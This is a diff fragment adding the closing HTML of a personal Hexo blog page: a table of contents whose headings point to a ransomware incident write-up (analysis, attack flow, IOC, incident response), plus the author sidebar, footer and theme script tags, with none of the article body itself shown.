+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#analysis"><span class="nav-number">1.</span> <span class="nav-text"> Analysis</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="nav-number">2.</span> <span class="nav-text"> 攻击流程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ransom"><span class="nav-number">3.</span> <span class="nav-text"> Ransom</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ioc"><span class="nav-number">4.</span> <span class="nav-text"> IOC</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%9E%E5%B8%B8%E8%A7%84%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="nav-number">5.</span> <span class="nav-text"> 非常规应急响应</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">xXxYOLOxXx</p>
+  <div class="site-description" itemprop="description">Explorer for unknown.</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">55</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">54</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/monster414" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;monster414" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yolo-yolo@qq.com" title="E-Mail → mailto:yolo-yolo@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://music.163.com/#/user/home?id=302397927" title="CloudMisuc → https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;302397927" rel="noopener" target="_blank"><i class=" fa-fw"></i>CloudMisuc</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://steamcommunity.com/id/Purple_Miracle/" title="Steam → https:&#x2F;&#x2F;steamcommunity.com&#x2F;id&#x2F;Purple_Miracle&#x2F;" rel="noopener" target="_blank"><i class=" fa-fw"></i>Steam</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://yoloyolo.top/atom.xml" title="RSS → https:&#x2F;&#x2F;yoloyolo.top&#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xXxYOLOxXx</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
